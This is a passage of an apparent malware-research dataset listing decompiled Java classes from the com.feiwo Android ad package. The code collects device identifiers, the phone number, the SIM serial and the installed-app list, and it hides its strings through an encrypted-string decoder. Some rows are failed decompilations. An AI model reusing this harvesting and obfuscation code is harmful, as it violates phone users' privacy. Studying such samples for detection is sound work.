file2=file;         l2=l;       }     }     long b2=b(file2);     if (!file2.delete()) {       return b2;     }     this.g.remove(file2);     return b2;   }   public long b(  File file){     return file.length();   }   public File b(  String str){     return new File(this.f89a,str.hashCode() + """");   }   public boolean c(  String str){     return a(str).delete();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.b.a\d.code","public class d implements Runnable {   final c f91a;   public d(  c cVar){     this.f91a=cVar;   }   @Override public void run(){     AtomicLong atomicLong;     AtomicInteger atomicInteger;     long b2;     Map map;     File[] listFiles=this.f91a.f89a.listFiles();     if (listFiles != null) {       int i=0;       int i2=0;       for (      File file : listFiles) {         b2=this.f91a.b(file);         i2=(int)(i2 + b2);         i++;         map=this.f91a.g;         map.put(file,Long.valueOf(file.lastModified()));       }       atomicLong=this.f91a.c;       atomicLong.set(i2);       atomicInteger=this.f91a.d;       atomicInteger.set(i);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.b.a\e.code","class e {   private static String a(  int i){     String str=System.currentTimeMillis() + """";     while (str.length() < 13) {       str=""0"" + str;     }     return str + ""-"" + i+ ' ';   }   public static int b(  byte[] bArr,  char c){     for (int i=0; i < bArr.length; i++) {       if (bArr[i] == c) {         return i;       }     }     return -1;   }   public static String b(  int i,  String str){     return a(i) + str;   }   private static boolean b(  byte[] bArr){     String[] d=d(bArr);     if (d != null && d.length == 2) {       String str=d[0];       while (str.startsWith(""0"")) {         str=str.substring(1,str.length());       }       if (System.currentTimeMillis() > Long.valueOf(str).longValue() + (Long.valueOf(d[1]).longValue() * 1000)) {         return true;       }     }     return false;   }   public static byte[] b(  byte[] bArr,  int i,  int i2){     int i3=i2 - i;     if (i3 < 0) {       throw new IllegalArgumentException(i + "" > "" + i2);     }     byte[] bArr2=new byte[i3];     System.arraycopy(bArr,i,bArr2,0,Math.min(bArr.length - i,i3));     return bArr2;   }   public static boolean c(  String str){     return b(str.getBytes());   }   public static boolean c(  byte[] bArr){     return bArr != null && bArr.length > 15 && bArr[13] == 45 && b(bArr,' ') > 14;   }   public static String d(  String str){     return (str == null || !c(str.getBytes())) ? str : str.substring(str.indexOf(32) + 1,str.length());   }   private static String[] d(  byte[] bArr){     if (c(bArr)) {       return new String[]{new String(b(bArr,0,13)),new String(b(bArr,14,b(bArr,' ')))};     }     return null;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.b.a\f.code","public class f {   private static Map<String,f> f;   private a c;   private boolean e;   private final String f93b=f.class.getSimpleName();   private final Gson d=new Gson();   protected Map<String,Object> f92a=new ConcurrentHashMap();   private f(  Context context,  String str,  boolean z){     this.e=true;     this.c=a.a(context,str);     this.e=false;   }   public static f a(  Context context,  String str,  boolean z){     if (f == null) { synchronized (f.class) {         if (f == null) {           f=new HashMap();         }       }     }     f fVar=f.get(com.feiwo.i.c.a.cy + str);     if (fVar == null) { synchronized (str) {         fVar=f.get(com.feiwo.i.c.a.cy + str);         if (fVar == null) {           fVar=new f(context,com.feiwo.i.c.a.cy + str,z);           f.put(com.feiwo.i.c.a.cy + str,fVar);         }       }     }     return fVar;   }   public SettingNode a(){     return (SettingNode)b(com.feiwo.i.c.a.cy + com.feiwo.i.c.a.f170a,new g(this).getType());   }   public <V>V a(  String str,  Type type){     try {       return (V)b(str,type);     }  catch (    Exception e) {       return null;     }   }   public void a(  SettingNode settingNode){     c(com.feiwo.i.c.a.cy + com.feiwo.i.c.a.f170a,settingNode,0);   }   public void a(  String str,  Object obj){     a(str,obj,-1);   }   public void a(  String str,  Object obj,  int i){     c(str,obj,i);   }   protected <V>V b(  String str,  Type type){     V v; synchronized (str) {       if (!this.e || !this.c.a(str) || (v=(V)this.f92a.get(str)) == null) {         String b2=this.c.b(str);         if (b2 == null || """".equals(b2)) {           v=null;         }  else {           v=(V)this.d.fromJson(b2,type);           if (this.e && this.f92a.get(str) == null) {             this.f92a.put(str,v);           }         }       }     }     return v;   }   public void b(  String str,  Object obj,  int i){     d(str,obj,i);   }   protected void c(  String str,  Object obj,  int i){ synchronized (str) {       String json=this.d.toJson(obj);       if (i > 0) {         this.c.a(str,json,i);       }  else {         this.c.a(str,json);       }       if (this.e) {         this.f92a.put(str,obj);       }     }   }   protected void d(  String str,  Object obj,  int i){ synchronized (str) {       this.c.b(str,this.d.toJson(obj),i);       if (this.e) {         this.f92a.put(str,obj);       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.b.a\g.code","public class g extends TypeToken<SettingNode> {   final f f94a;   public g(  f fVar){     this.f94a=fVar;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.c\a.code","public class a {   public static final String f96a=com.feiwo.i.c.a.a(""786C013F0FD9FE1D"");   public static final String f97b=com.feiwo.i.c.a.a(""5FFA8B88FD5813BB"");   public static final String c=com.feiwo.i.c.a.a(""ABDB0BC9670C823A57E79E1906FC32C9"");   public static final String d=com.feiwo.i.c.a.a(""EF9C23CFB641A9D7"");   public static final String e=com.feiwo.i.c.a.a(""1A196490672C548B333D5D5F2A9157878969ABE97C73E2D4A4A0643964A578459633AA82B3AFAB573B8B5935D98AE7667FC7A1CC40335151C39D19EF9E4A5F6D24F3E97D774458B2EC32645E8F0A1FFB41770D957D462F938E9B7F35D3A770979319304621D77DF411EB8B6B238995B7BC98997554A3D21440E6FE02755D494DCDDF4979EA3CBE1A"");   public static final String f=com.feiwo.i.c.a.a(""48385A1F53BA33EA"");   public static final String g=com.feiwo.i.c.a.a(""52E2E9456EF8C35E"");   public static final String h=com.feiwo.i.c.a.a(""985965356D7DCCFE9C2B1E910A6E0E1C"");   public static final String i=com.feiwo.i.c.a.a(""107C277402F2A9CA9C2B1E910A6E0E1C"");   public static final String j=com.feiwo.i.c.a.a(""6E977EFEFAAF5AB3"");   public static final String k=com.feiwo.i.c.a.a(""D5F89485FD9F6D683602888FA267D8BF7D2F7B9B6317DF31F8FB3089A4DD2F96A498E939FE6C92CF742E52C1312F1AD08721F18FA99E8F49DB7D559F21F106B0E2B988B5CC267C1C8F814AF603B1D1D32558FAF0E7711208CE8B60244A6EC409C50D2C7240AD1A8EA567CA27BFB9E150"");   public static int l=0;   public static final String[] m={d + com.feiwo.i.c.a.a(""E3F304ABBC2D3303307B0B8511846DB04CED93729B01CCE91B0CE93EC3BC3E6611F730DDAA3012FC""),d + com.feiwo.i.c.a.a(""D0FEE34DBE623B199A5E424F1BC02A396ED48E1E598333A7746D3E8DFF76B2E7"")};   public static final String n=d + com.feiwo.i.c.a.a(""2F2C5D30EECCB17A431985FF61DF9ED197DEC3B9F71191EEE7BDC86CB4AC062527DD13B06FB3823BF5A1E6A4ECE36FAB"");   public static final String o=com.feiwo.i.c.a.a(""49DCA3D6F92B7957"");   public static final String p=com.feiwo.i.c.a.a(""EA1960D8A5578A7A"");   public static final String q=com.feiwo.i.c.a.a(""A3A64CA485D3D721B067BCB6581E75A7"");   public static final String r=com.feiwo.i.c.a.a(""945352F7AF8E36B4B067BCB6581E75A7"");   public static final String s=com.feiwo.i.c.a.a(""2A57CDC2E2D620B9"");   public static final String t=com.feiwo.i.c.a.a(""C3268001600D7889D4857A892F541227"");   public static final String u=com.feiwo.i.c.a.a(""DB95D8728AE11247E27E9EA5E9809D52"");   public static final String v=com.feiwo.i.c.a.a(""663A267DD15BF2C18252DCD7C0836DDE"");   public static final String w=com.feiwo.i.c.a.a(""7501049198862B7CA1DEADB0D550508D"");   public static final String x=com.feiwo.i.c.a.a(""2C54F772EAA2403D647B3206F3671DA4"");   public static final String y=com.feiwo.i.c.a.a(""D528A252DA3DE4D0AE3BA93AB60447A5"");   public static final String z=com.feiwo.i.c.a.a(""E32EC632AB0E552CB871CB5F7B73AC95"");   public static final String A=com.feiwo.i.c.a.a(""164C45B48BEDD020B91ED2700324C40F"");   public static final String B=com.feiwo.i.c.a.a(""02E7BA32F9568216BA25D2EA29C283BA"");   public static final String C=com.feiwo.i.c.a.a(""77EF4B3F83F5B93796D777769E1201E4"");   public static final String D=com.feiwo.i.c.a.a(""200B9E4E7886AAB78FA487ECCBE5E280B067BCB6581E75A7"");   public static final String E=com.feiwo.i.c.a.a(""6300C1B83632BBAC"");   public static String F=r + com.feiwo.i.c.a.a(""DFBB6FE5D069623D7F079FF9B520BEDA"");   public static final String G=com.feiwo.i.c.a.a(""BD9E975F56CAF0A9F551BE50372EF13D8B6177D8FA3555A0F77814ABC09BAF472C3B7F86513D302C"");   public static final String H=com.feiwo.i.c.a.a(""BD9E975F56CAF0A9F551BE50372EF13DF84BD3CC9216FE27DCF0B2E455B696CB"");   public static final String I=com.feiwo.i.c.a.a(""7E9F74DA33DD911AE157A6EFF1BC036C1E5D0527AD4BBE44758E97798E0F16B6675CBE6E79E4727E"");   public static String J=com.feiwo.i.c.a.a(""C50AE4FC7456EEE2E5A3713D9739D3FE"");   public static String K=com.feiwo.i.c.a.a(""323C50BB8A4288C7AB8A7F53CA458855"");   public static String L=com.feiwo.i.c.a.a(""5F8C814060ABBDFC5952B409E93479E4"");   public static final String M=com.feiwo.i.c.a.a(""19DF6684F1B97D42B067BCB6581E75A7"");   public static final String N=com.feiwo.i.c.a.a(""C3EFD2C533E791E548CDCF565B49A4BF"");   public static final String O=com.feiwo.i.c.a.a(""F0EEF6C55E995B8F13B95674E82C8578"");   public static final String P=com.feiwo.i.c.a.a(""53488F2652597B50120C16033573A2BE"");   public static final String Q=com.feiwo.i.c.a.a(""D7E9EE33518B121C64A27E90780BB1D320FBADFE6408CA9F"");   public static final String R=com.feiwo.i.c.a.a(""69F5985CE9E25FCF4177C91A8F0535B9B067BCB6581E75A7"");   public static final Integer S=0;   public static final String T=com.feiwo.i.c.a.a(""9A81E41EFD49B09A0CC1A3DA6B13E14D"");   public static final String U=com.feiwo.i.c.a.a(""542F20DED9F80DB3B067BCB6581E75A7"");   public static final String V=com.feiwo.i.c.a.a(""9DC17D6477C3A3EA50FE70A7E74B9A63"");   public static final String W=com.feiwo.i.c.a.a(""09B99B4B1B3D1D2050FE70A7E74B9A63"");   public static final String X=com.feiwo.i.c.a.a(""682A1E4D89964189B067BCB6581E75A7"");   public static final String Y=com.feiwo.i.c.a.a(""B121655D8BBC47A99182AA5E2250B58F"");   public static final String Z=com.feiwo.i.c.a.a(""B88561FDDA16EEC0C7AF3BAD8B9FDB53"");   public static final String aa=com.feiwo.i.c.a.a(""B4FB11DA9C3017F2406BA1220D8EA21FF0F7692867717978"");   public static final String ab=com.feiwo.i.c.a.a(""1D9DDED063287BD9D7C1D5D2660A3034"");   public static final String ac=com.feiwo.i.c.a.a(""23EECF9E3F1457EAB0A34390B7694B5E120C16033573A2BE"");   public static final String ad=com.feiwo.i.c.a.a(""23EECF9E3F1457EA568AC76C36E6A403B21088CDAF0C8649"");   public static final String ae=com.feiwo.i.c.a.a(""23EECF9E3F1457EA0502497A9A1397A11DBBFC8EA6B955D5"");   public static final String af=com.feiwo.i.c.a.a(""23EECF9E3F1457EA8DD3D06372A6B42B85458AFC7C8D3497A19A67760C62724A"");   public static final String ag=com.feiwo.i.c.a.a(""6AEDABBA62B1DD1E372C1DECD2A51F3A"");   public static final String ah=com.feiwo.i.c.a.a(""82D166CDE2F2C2EFC80BF5212135C0E4EFBC90521FF32A3BC21B61D3C8B45668D0AD785D0C739EF2"");   public static final String ai=com.feiwo.i.c.a.a(""82D166CDE2F2C2EFC80BF5212135C0E4EFBC90521FF32A3BED2A8633616B61FB93D66AFD006DA231"");   public static final String aj=com.feiwo.i.c.a.a(""82D166CDE2F2C2EFC80BF5212135C0E4EFBC90521FF32A3B0239436CD3FB8D42E3ACE2A2F1E405081599219BB1804AE8"");   public static final String ak=com.feiwo.i.c.a.a(""97BDB8D0E27B51DEE7D499DACA9B1955CC9B2D2BC6DECDD4"");   public static final String al=com.feiwo.i.c.a.a(""3602AC6773562555"");   public static final String am=com.feiwo.i.c.a.a(""023EC18F305A6AC0"");   public static final String an=com.feiwo.i.c.a.a(""2E9B4BA2EF481B90647B3206F3671DA4"");   public static final String ao=com.feiwo.i.c.a.a(""14A8C3BA2245F8272162D95AC13153DB"");   public static final String ap=com.feiwo.i.c.a.a(""A85330D4878813DD5231FDA4823335D9"");   public static final String aq=com.feiwo.i.c.a.a(""B2753BC0C3F00839DC6DAA800E1D407C"");   public static final String ar=com.feiwo.i.c.a.a(""D04D517FFC521608"");   public static final String as=com.feiwo.i.c.a.a(""B1AC8366FE8EA6D513A9C5180DB18505"");   public static final String at=com.feiwo.i.c.a.a(""F4E0BB4D9B833C57DEB3C4802FC16D1D"");   public static final String au=com.feiwo.i.c.a.a(""ECA89E44B1F64E98A3BD1C4514258EC9"");   public static final String av=com.feiwo.i.c.a.a(""D97B73392271E91F112E4B983E06DD01"");   public static final String aw=com.feiwo.i.c.a.a(""80300FCD87E999BD"");   public static final String ax=com.feiwo.i.c.a.a(""5DAA188934619E1EAA16C2EC5B2D5B1FB067BCB6581E75A7"");   public static final String ay=com.feiwo.i.c.a.a(""DCF0B2E455B696CB"");   public static final String az=com.feiwo.i.c.a.a(""175DF0250F73E8A7"");   public static final String aA=com.feiwo.i.c.a.a(""CE85D1CD45B54FFC20FBADFE6408CA9F""); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7f3e8072"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\b.code","public final class b implements com.feiwo.f.a.g {   @Override public void a(  com.feiwo.f.a.h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\c.code","final class c extends TypeToken<UserInfo> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\d.code","public final class d extends TypeToken<GlobalInfo> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\e.code","!org.eclipse.jdt.core.dom.TypeDeclaration@17a2def8"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\f.code","public class f implements Runnable {   final e f101a;   public f(  e eVar){     this.f101a=eVar;   }   @Override public void run(){     GlobalInfo u=this.f101a.u();     u.imei=t.a(this.f101a.n()).a();     u.phoneNumber=t.a(this.f101a.n()).b();     u.simSerialNumber=t.a(this.f101a.n()).c();     u.installApp=q.a(this.f101a.n());     u.mnc=com.feiwo.i.f.a(this.f101a.n()).a();     this.f101a.s().setImei(u.imei);     this.f101a.s().setPhoneNumber(u.phoneNumber);     this.f101a.s().setSimSerialNum(u.simSerialNumber);     this.f101a.s().setAppList(u.installApp);     this.f101a.s().setOperator(u.mnc);     a.a(this.f101a.d,u);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\g.code","public class g implements com.feiwo.i.b.d {   final AdInfo f102a;   final Context f103b;   final e c;   public g(  e eVar,  AdInfo adInfo,  Context context){     this.c=eVar;     this.f102a=adInfo;     this.f103b=context;   }   @Override public void a(  Drawable drawable,  String str){     Intent intent=null;     if (this.f102a.getKind().intValue() == 1) {       intent=q.a(this.f103b,q.a(this.c.o(),this.f102a));     }  else     if (this.f102a.getKind().intValue() == 2) {       intent=this.c.b(this.f103b,this.f102a);     }     this.c.a(this.f102a,drawable,intent);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\h.code","public class h implements com.feiwo.f.a.g {   final int f104a;   final e f105b;   public h(  e eVar,  int i){     this.f105b=eVar;     this.f104a=i;   }   @Override public void a(  com.feiwo.f.a.h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){     this.f105b.a(hVar,this.f104a,rootNode,rootNode2);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\i.code","public class i implements com.feiwo.i.b.d {   final Context f106a;   final AdInfo f107b;   final String c;   final e d;   public i(  e eVar,  Context context,  AdInfo adInfo,  String str){     this.d=eVar;     this.f106a=context;     this.f107b=adInfo;     this.c=str;   }   @Override public void a(  Drawable drawable,  String str){     this.d.a(new j(this,drawable));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\j.code","class j implements Runnable {   final Drawable f108a;   final i f109b;   public j(  i iVar,  Drawable drawable){     this.f109b=iVar;     this.f108a=drawable;   }   @Override public void run(){     NotificationInfo downloadOkInfo=new NotificationInfo(this.f109b.f106a,90000 + this.f109b.f107b.getAdId().intValue()).getDownloadOkInfo(this.f109b.f107b,u.a(this.f109b.f106a,this.f109b.f107b).getUninstallBar().isOn() ? 32 : 16,this.f109b.c);     downloadOkInfo.notiIcon=this.f108a;     s.a(this.f109b.f106a,downloadOkInfo);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\k.code","public class k implements Runnable {   final com.feiwo.f.a.i f110a;   final RequestCache f111b;   final e c;   public k(  e eVar,  com.feiwo.f.a.i iVar,  RequestCache requestCache){     this.c=eVar;     this.f110a=iVar;     this.f111b=requestCache;   }   @Override public void run(){     this.c.f100b.a(this.f110a,new l(this));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\l.code","class l implements com.feiwo.f.a.g {   final k f112a;   public l(  k kVar){     this.f112a=kVar;   }   @Override public void a(  com.feiwo.f.a.h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){     RootNode<?> rootNode3=this.f112a.f111b.data;     if (rootNode3.getAction().getActions().size() > 0) {       Integer action=rootNode3.getAction().getActions().get(0).getAction();       rootNode3.getAction().getActions().get(0).getAdId();       this.f112a.c.a(hVar,action.intValue(),rootNode3,rootNode2);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\m.code","public class m implements Runnable {   final e f113a;   public m(  e eVar){     this.f113a=eVar;   }   @Override public void run(){     new com.feiwo.f.b.a(new com.feiwo.f.b.b(new com.feiwo.f.b.g(new com.feiwo.f.b.c(null)))).a(this.f113a,this.f113a.e().getRootNode());   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\n.code","public class n implements Runnable {   final com.feiwo.f.a.i f114a;   final com.feiwo.f.a.g f115b;   final e c;   public n(  e eVar,  com.feiwo.f.a.i iVar,  com.feiwo.f.a.g gVar){     this.c=eVar;     this.f114a=iVar;     this.f115b=gVar;   }   @Override public void run(){     this.c.g();     this.c.f100b.a(this.f114a,this.f115b);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\o.code","public class o implements com.feiwo.f.a.g {   final e f116a;   public o(  e eVar){     this.f116a=eVar;   }   @Override public void a(  com.feiwo.f.a.h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d\p.code","public class p implements Runnable {   final AdInfo f117a;   final e f118b;   public p(  e eVar,  AdInfo adInfo){     this.f118b=eVar;     this.f117a=adInfo;   }   @Override public void run(){     this.f118b.a(this.f118b.n(),this.f117a,8,(String)null);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.d.a\a.code","public interface a {   void a(  Context context,  AppInfo appInfo,  Drawable drawable);   void a(  Context context,  AdInfo adInfo,  int i,  String str);   void a(  Context context,  boolean z,  AdInfo adInfo,  String str,  Drawable drawable,  String str2,  boolean z2);   void a(  SettingNode settingNode);   void a(  String str);   void b(  Context context);   void d(  Context context,  int i); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.e\a.code","public class a extends com.feiwo.f.a.a {   private final String f119a=a.class.getSimpleName();   @Override protected UserInfo a(  i iVar){     r.a(this.f119a,""getUserInfoFromeCache"");     Integer showStyle=iVar.f().getAd().getShowStyle();     if (showStyle == null) {       return com.feiwo.d.e.a(iVar.j());     }     UserInfo userInfo=(UserInfo)iVar.j().a(com.feiwo.c.a.v + showStyle,new b(this).getType());     return userInfo == null ? new UserInfo() : userInfo;   }   @Override public RootNode<?> a(  i iVar,  String str){     r.a(this.f119a,""getAdListRootNodeFromeCache"");     Integer showStyle=iVar.f().getAd().getShowStyle();     return showStyle != null ? super.a(iVar,com.feiwo.c.a.u + showStyle) : super.a(iVar,str);   }   @Override public void a(  i iVar,  RootNode<?> rootNode,  List<?> list,  int i){     r.a(this.f119a,""saveAdListRootNodeToCache"");     Integer showStyle=rootNode.getAd().getShowStyle();     if (showStyle == null) {       super.a(iVar,rootNode,list,i);     }  else {       iVar.j().a(com.feiwo.c.a.u + showStyle,list,i);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.e\b.code","class b extends TypeToken<UserInfo> {   final a f120a;   public b(  a aVar){     this.f120a=aVar;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.e\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1b84b433"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.e\d.code","class d extends TypeToken<Integer> {   final c f122a;   public d(  c cVar){     this.f122a=cVar;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.e\e.code","class e extends TypeToken<Integer> {   final c f123a;   public e(  c cVar){     this.f123a=cVar;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f\a.code","public class a {   private d f124a;   public d a(){     if (this.f124a == null) { synchronized (getClass()) {         this.f124a=new d(this);         this.f124a.a(new e());         this.f124a.a(new j());         this.f124a.a(new com.feiwo.f.a.d());         this.f124a.a(new com.feiwo.f.a.c());         this.f124a.a(new k());       }     }     return this.f124a;   }   public void a(  i iVar,  g gVar){     iVar.a(new Handler());     iVar.a(gVar);     com.feiwo.i.a.d.a().a(new Thread(new b(this,iVar)));   }   public void a(  Object obj){     a().a(obj);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f\b.code","public class b implements Runnable {   final i f138a;   final a f139b;   public b(  a aVar,  i iVar){     this.f139b=aVar;     this.f138a=iVar;   }   @Override public void run(){     this.f139b.a().b(this.f138a);     this.f139b.a().a(this.f138a);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f\c.code","public class c {   final a f148a;   private c f149b;   private c c;   private Object d;   public c(  a aVar){     this.f148a=aVar;   }   public static c a(  c cVar,  c cVar2){     cVar.f149b=cVar2;     return cVar2;   }   public static Object a(  c cVar){     return cVar.d;   }   public static Object a(  c cVar,  Object obj){     cVar.d=obj;     return obj;   }   public static c b(  c cVar){     return cVar.c;   }   public static c b(  c cVar,  c cVar2){     cVar.c=cVar2;     return cVar2;   }   public static c c(  c cVar){     return cVar.f149b;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f\d.code","public class d {   final a f150a;   private c f151b;   private c c;   public d(  a aVar){     this.f150a=aVar;   }   public void a(  i iVar){     for (c cVar=this.f151b; cVar != null; cVar=c.b(cVar)) {       if (c.a(cVar) instanceof m) {         ((m)c.a(cVar)).a(iVar);       }     }   }   public void a(  Object obj){     c cVar=new c(this.f150a);     c.a(cVar,obj);     c.a(cVar,this.c);     if (this.f151b == null) {       this.f151b=cVar;     }     if (this.c != null) {       c.b(this.c,cVar);     }     this.c=cVar;   }   public void b(  i iVar){     for (c cVar=this.c; cVar != null; cVar=c.c(cVar)) {       if (c.a(cVar) instanceof f) {         ((f)c.a(cVar)).b(iVar);       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\a.code","public class a implements f<i>, m<i> {   private final String f125a=com.feiwo.i.c.a.cb;   private void a(  com.feiwo.b.a.f fVar,  List<ActionExt> list,  int i){     List<ActionExt> a2=a(fVar);     for (int i2=0; i2 < a2.size(); i2++) {       ActionExt actionExt=a2.get(i2);       for (int i3=0; i3 < list.size(); i3++) {         ActionExt actionExt2=list.get(i3);         if (actionExt.getAction().intValue() == actionExt2.getAction().intValue() && actionExt.getAdId().intValue() == actionExt2.getAdId().intValue()) {           a2.get(i2).setExpireDate(((int)(v.a() / 1000)) + i);         }       }     }     a(fVar,a2);   }   protected int a(  List<ActionExt> list,  int i){     if (list != null) {       for (      ActionExt actionExt : list) {         if (actionExt.getAction().intValue() == i) {           return actionExt.getExpireDate();         }       }     }     return 0;   }   protected UserInfo a(  i iVar){     return com.feiwo.d.e.a(iVar.j());   }   protected ActionExt a(  List<ActionExt> list,  int i,  int i2){     if (list != null && list.size() != 0) {       int i3=0;       while (true) {         int i4=i3;         if (i4 >= list.size()) {           break;         }         ActionExt actionExt=list.get(i4);         if (actionExt.getAdId().intValue() == i2 && actionExt.getAction().intValue() == i) {           return actionExt;         }         i3=i4 + 1;       }     }     return null;   }   protected AdNode<?> a(  i iVar,  RootNode<?> rootNode,  List<?> list){     int k=iVar.d() == null ? com.feiwo.d.e.a(iVar.j()).lastAdId : iVar.d().k();     AdNode<?> createAdNode=rootNode.createAdNode();     AdInfo a2=com.feiwo.d.e.a(iVar.j(),list,Integer.valueOf(k));     ArrayList arrayList=new ArrayList();     arrayList.add(a2);     createAdNode.setAdType(Integer.valueOf(iVar.i()));     createAdNode.setAdList(arrayList);     return createAdNode;   }   public RootNode<?> a(  i iVar,  String str){     return b(iVar,(List)iVar.j().a(str,com.feiwo.c.b(iVar.i())));   }   protected synchronized List<ActionExt> a(  com.feiwo.b.a.f fVar){     List<ActionExt> list;     list=(List)fVar.a(com.feiwo.c.a.w,new b(this).getType());     if (list == null) {       list=new ArrayList<>();     }     return list;   }   protected List<ActionExt> a(  com.feiwo.b.a.f fVar,  int i,  long j){     List<ActionExt> a2=a(fVar);     if (a2 == null) {       return null;     }     ArrayList arrayList=new ArrayList();     if (a2 != null) {       int i2=0;       while (true) {         int i3=i2;         if (i3 >= a2.size()) {           break;         }         ActionExt actionExt=a2.get(i3);         int expireDate=(int)(j - actionExt.getExpireDate());         int abs=Math.abs((int)(j - actionExt.getExpireDate()));         if (j == 0) {           arrayList.add(actionExt);         }  else         if (j >= actionExt.getExpireDate() || expireDate > 0 || abs > 86400) {           arrayList.add(actionExt);         }         i2=i3 + 1;       }     }     return arrayList;   }   protected List<AdInfo> a(  i iVar,  List<AdInfo> list){     if (list == null || list.size() == 0) {       return null;     }     GlobalInfo b2=com.feiwo.d.e.b(com.feiwo.d.e.a(iVar.h()));     if (b2.installApp == null || b2.installApp.isEmpty()) {       return list;     }     List<Map<String,String>> list2=b2.installApp;     Iterator<AdInfo> it=list.iterator();     while (it.hasNext()) {       String packageName=it.next().getPackageName();       if (!TextUtils.isEmpty(packageName)) {         int i=0;         while (true) {           int i2=i;           if (i2 >= list2.size()) {             break;           }           if (packageName.equals(list2.get(i2).get(com.feiwo.i.c.a.bh))) {             it.remove();             break;           }           i=i2 + 1;         }       }     }     return list;   }   protected synchronized void a(  com.feiwo.b.a.f fVar,  List<ActionExt> list){     fVar.a(com.feiwo.c.a.w,list);   }   protected void a(  com.feiwo.b.a.f fVar,  List<ActionExt> list,  ActionExt actionExt){     boolean z=false;     int i=0;     while (true) {       if (i >= list.size()) {         z=true;         break;       }       ActionExt actionExt2=list.get(i);       if (actionExt2.getAdId().intValue() == actionExt.getAdId().intValue() && actionExt2.getAction().intValue() == actionExt.getAction().intValue()) {         actionExt2.setCount(actionExt.getCount());         break;       }       i++;     }     if (z) {       list.add(actionExt);     }     a(fVar,list);   }   protected synchronized void a(  i iVar,  int i){     String b2=iVar.b();     com.feiwo.b.a.f a2=com.feiwo.d.e.a(iVar.h());     GlobalInfo b3=com.feiwo.d.e.b(a2);     b3.addActionToCacheMap(new RequestCache(iVar.i(),b2,iVar.f()));     